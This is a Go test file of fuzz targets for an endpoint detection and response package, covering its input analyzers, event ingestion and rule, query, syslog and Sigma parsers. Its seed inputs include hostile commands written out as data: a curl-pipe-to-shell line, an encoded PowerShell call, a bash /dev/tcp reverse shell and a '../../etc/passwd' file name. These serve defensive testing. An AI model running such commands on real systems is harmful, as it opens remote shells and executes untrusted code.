package edr

import (
	"context"
	"encoding/json"
	"path/filepath"
	"testing"
	"time"
)

// Fuzz targets for untrusted-input entry points. Run briefly with e.g.
//   go test ./internal/edr -run '^$' -fuzz FuzzInspectText -fuzztime 20s
// Seeds also run as ordinary unit tests.

func FuzzInspectText(f *testing.F) {
	seeds := []string{
		"powershell -enc SQBFAFgA", "curl http://x | sh", "http://a.b/%00?x=1#y", "xn--e1afmkfd.example", "[core]\nrepo=1",
		"From: a@b\r\nSubject: x\r\n\r\nhi", "package-lock.json", "", "\x00\xff\xfe", "http://[::1]:99999/", "a=b\n[section\n",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	kinds := []string{InspectKindScript, InspectKindCmdline, InspectKindDomain, InspectKindConfig, InspectKindLockfile, InspectKindURL, InspectKindEmail}
	f.Fuzz(func(t *testing.T, s string) {
		if len(s) > 1<<16 {
			t.Skip()
		}
		for _, k := range kinds {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			RunAnalyzers(ctx, InspectInput{Kind: k, Name: "fuzz", Text: s, Data: []byte(s)})
			cancel()
		}
	})
}

func FuzzInspectFileBytes(f *testing.F) {
	f.Add([]byte("PK\x03\x04"))
	f.Add([]byte("MZ\x90\x00"))
	f.Add([]byte("\x7fELF"))
	f.Add([]byte("%PDF-1.7\n1 0 obj<</JS (x)>>endobj"))
	f.Add([]byte("\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"))
	f.Add([]byte("H4sIAAAAAAAA"))
	f.Fuzz(func(t *testing.T, b []byte) {
		if len(b) > 1<<18 {
			t.Skip()
		}
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()
		RunAnalyzers(ctx, InspectInput{Kind: InspectKindFile, Name: "../../etc/passwd", Data: b})
	})
}

func FuzzIngestEventJSON(f *testing.F) {
	f.Add(`{"host":"h","pid":1,"time":"2026-01-01T00:00:00Z","command":"bash -i >& /dev/tcp/1.2.3.4/9 0>&1"}`)
	f.Add(`{"host":"h","pid":-5,"time":"0001-01-01T00:00:00Z"}`)
	f.Add(`null`)
	f.Add(`{"command":"` + string(make([]byte, 100)) + `"}`)
	dir := f.TempDir()
	store, err := NewStore(filepath.Join(dir, "s.json"), 100)
	if err != nil {
		f.Fatal(err)
	}
	f.Fuzz(func(t *testing.T, s string) {
		var e Event
		if json.Unmarshal([]byte(s), &e) != nil {
			return
		}
		_, _ = store.Ingest(e)
	})
}

func FuzzTelemetryValidate(f *testing.F) {
	f.Add(`{"host":"h","time":"2026-01-01T00:00:00Z","method":"ssh","outcome":"failure","source_ip":"1.2.3.4"}`, "auth")
	f.Add(`{"host":"h","time":"2026-01-01T00:00:00Z","query":"a.b.c","answers":["1.2.3.4"]}`, "dns")
	f.Add(`{"host":"h","time":"2026-01-01T00:00:00Z","key":"HKLM\\x","operation":"set"}`, "registry")
	f.Fuzz(func(t *testing.T, s, typ string) {
		var e TelemetryEvent
		if json.Unmarshal([]byte(s), &e) != nil {
			return
		}
		_ = e.Validate(typ)
	})
}

func FuzzParseSeqQuery(f *testing.F) {
	f.Add(`sequence by host [process where command ~ "a"] [network where dest_port == 22]`)
	f.Add(`process where command regex "(a+)+$"`)
	f.Add(`[[[[`)
	f.Fuzz(func(t *testing.T, s string) {
		if len(s) > 1<<14 {
			t.Skip()
		}
		_, _ = parseSeq(s)
	})
}

func FuzzParseLabRule(f *testing.F) {
	f.Add([]byte(`{"id":"x","name":"n","severity":"high","event_type":"process","logic":{"op":"regex","field":"command","value":"(a|b)*c"}}`))
	f.Add([]byte(`{}`))
	f.Add([]byte(`null`))
	f.Fuzz(func(t *testing.T, b []byte) {
		if len(b) > 1<<16 {
			t.Skip()
		}
		if r, err := ParseLabRule(b); err == nil && r != nil {
			_ = r.Validate()
		}
	})
}

func FuzzParseBytePack(f *testing.F) {
	f.Add([]byte(`{"rules":[]}`))
	f.Add([]byte(`[{"id":"a","pattern":"(("}]`))
	f.Fuzz(func(t *testing.T, b []byte) {
		if len(b) > 1<<16 {
			t.Skip()
		}
		_, _ = ParseBytePack(b)
	})
}

func FuzzParseSyslog(f *testing.F) {
	f.Add("<34>1 2026-01-01T00:00:00Z host app 1 ID - msg")
	f.Add("<13>Jan  1 00:00:00 host sshd[1]: Failed password for root from 1.2.3.4")
	f.Add("<<<<")
	f.Fuzz(func(t *testing.T, s string) {
		_, _ = ParseSyslog(s, time.Unix(0, 0))
	})
}

func FuzzSigmaConvert(f *testing.F) {
	f.Add([]byte("title: t\nlogsource:\n  category: process_creation\ndetection:\n  sel:\n    CommandLine|contains: x\n  condition: sel\n"))
	f.Add([]byte("---\n- a\n- b\n"))
	f.Fuzz(func(t *testing.T, b []byte) {
		if len(b) > 1<<16 {
			t.Skip()
		}
		_, _ = sigmaConvertDocument(b)
	})
}
